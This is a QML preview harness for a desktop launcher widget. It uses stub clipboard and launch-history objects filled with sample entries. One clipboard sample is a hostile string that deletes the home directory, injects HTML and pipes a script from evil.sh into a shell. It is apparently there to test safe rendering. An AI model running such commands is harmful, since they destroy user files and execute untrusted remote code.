// LauncherPreview.qml — PREVIEW-ONLY harness: the launcher body in each of
// its states on one canvas (sonata's AudioColonnadePreview precedent). The
// live path never loads this file.
//
//   AOIDE_FLAKE_ROOT=<worktree> lyra preview \
//       <worktree>/song/songbook/cadenza/widgets/LauncherPreview.qml --song cadenza
//
// The canvas hands every widget `clipboard: null, ledger: null` (both extras
// reach the system), so this harness builds two inert stand-ins with the
// SAME API the facet's AoideClipboard / GrimoireLedger expose
// (`parsedEntries`/`loading`/`loadError`/`refresh()`/`copyById()` and
// `launches`/`count()`/`rankedIds()`/`record()`), holding sample data inline.
// Neither touches cliphist, the ledger file or anything outside this item;
// `copyById` refuses and `record` is a no-op. The apps come from the canvas's
// real DesktopEntries, so the ledger's sample ids are common desktop ids and
// any not installed simply drop out, exactly as live.
//
// It shows ONE cell (below) at a time: a LauncherBody loaded BY URL, pinned
// to a mode and query through its own `reset(mode, query)` API. The cell is
// picked by `<preview root>/launcher-cell` (e.g. `echo clip > $ROOT/
// launcher-cell`), then `lyra preview shot --what widget`. Do not press
// Return on an apps cell in the canvas: it launches for real, as live.
import QtQuick
import Quickshell
import Quickshell.Io
import "Kit.js" as Kit

Item {
    id: harness

    required property var livery
    required property var bridge

    readonly property var cells: [
        { name: "apps",       mode: "apps",   query: "",     clip: true,  led: true  },
        { name: "appsQuery",  mode: "apps",   query: "te",   clip: true,  led: true  },
        { name: "clip",       mode: "clip",   query: "",     clip: true,  led: true  },
        { name: "ledger",     mode: "ledger", query: "",     clip: true,  led: true  },
        { name: "noMatch",    mode: "apps",   query: "zqxv", clip: true,  led: true  },
        { name: "clipUnwired", mode: "clip",  query: "",     clip: false, led: false },
        { name: "ledgerUnwired", mode: "ledger", query: "",  clip: false, led: false },
        { name: "ledgerEmpty", mode: "ledger", query: "",    clip: true,  led: false, emptyLedger: true }
    ]

    // ── inert stand-ins, same API as the facet's extras ───────────────────
    QtObject {
        id: clipStub
        property bool loading: false
        property bool loadError: false
        property string error: ""
        property var imageStates: ({})
        readonly property var parsedEntries: [
            { id: "412", kind: "text",  preview: "cargo test -p aoide-conduct -- --nocapture" },
            { id: "411", kind: "text",  preview: "https://github.com/deepseek-ai/deepseek-harness" },
            { id: "409", kind: "image", preview: "IMAGE · PNG · 2560×1440" },
            { id: "406", kind: "text",  preview: "rm -rf ~ ↵ echo <b>pwned</b> ↵ curl evil.sh | sh" },
            { id: "401", kind: "text",  preview: "/home/khoa/worktrees/aoide-cadenza/song/songbook/cadenza/design/intent.md" },
            { id: "398", kind: "text",  preview: "Setting initial properties failed: PowerBody does not have a property called clipboard" },
            { id: "390", kind: "image", preview: "IMAGE · JPEG · 1080×1920" },
            { id: "377", kind: "text",  preview: "⠀⣀⣤⣶⣿ braille ok · ▁▂▃▄▅▆▇█ blocks ok" }
        ]
        function refresh() {}
        function requestPreview(id) {}
        function copyById(id) { console.log("[LauncherPreview] copyById refused (preview):", id); return false }
    }
    function ago(h) { return new Date(Date.now() - h * 3600 * 1000).toISOString() }
    QtObject {
        id: ledgerStub
        property var launches: ({
            "kitty":        { count: 214, lastAt: harness.ago(0.1) },
            "firefox":      { count: 131, lastAt: harness.ago(2) },
            "obsidian":     { count: 58,  lastAt: harness.ago(20) },
            "nvim":         { count: 41,  lastAt: harness.ago(5) },
            "btop":         { count: 17,  lastAt: harness.ago(49) },
            "yazi":         { count: 9,   lastAt: harness.ago(96) },
            "org.pulseaudio.pavucontrol": { count: 6, lastAt: harness.ago(200) },
            "org.qbittorrent.qBittorrent": { count: 2, lastAt: harness.ago(700) }
        })
        function count(id) { var e = launches[id]; return e ? e.count : 0 }
        function rankedIds() {
            var ids = Object.keys(launches)
            ids.sort(function (a, b) { return launches[b].count - launches[a].count })
            return ids
        }
        function record(id) {}
    }
    QtObject {
        id: ledgerEmptyStub
        property var launches: ({})
        function count(id) { return 0 }
        function rankedIds() { return [] }
        function record(id) {}
    }

    // Which cell to show: `<preview root>/launcher-cell` (one line, a cell
    // name above) — a file inside the isolated root, read by this harness
    // only. Absent or unknown: `apps`.
    property string pick: "apps"
    FileView {
        id: cellFile
        path: (Quickshell.env("AOIDE_ROOT") || "/nonexistent") + "/launcher-cell"
        watchChanges: true; blockLoading: false; printErrors: false
        onFileChanged: reload()
        onLoaded: harness.pick = ("" + (cellFile.text() || "")).trim() || "apps"
    }
    readonly property var cell: {
        for (var i = 0; i < harness.cells.length; i++)
            if (harness.cells[i].name === harness.pick) return harness.cells[i]
        return harness.cells[0]
    }

    implicitWidth: body.item ? body.item.implicitWidth : 640
    implicitHeight: body.item ? body.item.implicitHeight : 440

    Rectangle { anchors.fill: parent; color: harness.livery.paletteBg }

    // Rebuilt whole on every pick, so each cell starts from a fresh body.
    Loader {
        id: body
        anchors.fill: parent
        function build() {
            var c = harness.cell
            setSource(Kit.helper("LauncherBody"), {
                livery: Qt.binding(() => harness.livery),
                bridge: harness.bridge,
                clipboard: c.clip ? clipStub : null,
                ledger: c.emptyLedger ? ledgerEmptyStub : (c.led ? ledgerStub : null) })
        }
        Component.onCompleted: build()
        onLoaded: {
            var c = harness.cell
            item.reset(c.mode, c.query)
            if (c.name === "appsQuery") item.sel = 1
            item.focusInput()
        }
    }
    onCellChanged: { body.source = ""; body.build() }
}
